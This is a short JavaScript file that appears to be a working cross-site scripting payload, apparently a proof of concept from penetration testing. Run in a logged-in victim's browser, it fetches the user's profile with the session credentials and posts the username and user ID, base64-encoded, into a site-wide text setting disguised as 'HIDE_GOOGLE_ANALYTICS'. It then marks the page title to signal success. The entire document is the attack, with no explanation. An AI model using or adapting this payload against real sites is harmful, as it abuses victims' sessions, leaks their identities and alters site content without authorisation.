(function () {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/profile/GetProfile', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    xhr.onload = function () {
      try {
        var data = JSON.parse(xhr.responseText);
        var uname = data.userData.userName || 'empty';
        var proof = 'XSS_PROOF:' + uname + ':' + data.userData.userID;

        var post = new XMLHttpRequest();
        post.open('POST', '/api/Content/AddSiteText', true);
        post.withCredentials = true;
        post.setRequestHeader('Content-Type', 'application/json');
        post.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        post.onload = function () {
          try { document.title = '[EXFIL_OK_' + uname + '] ' + document.title; } catch (e) {}
        };
        post.send(JSON.stringify({
          name:        'HIDE_GOOGLE_ANALYTICS',
          langId:      1,
          brandId:     68,
          stringValue: btoa(proof)
        }));
      } catch (e) {
        try { document.title = '[PARSE_ERR] ' + document.title; } catch (ee) {}
      }
    };
    xhr.send();
  } catch (e) {
    try { document.title = '[XSS_ERR] ' + document.title; } catch (ee) {}
  }
})();
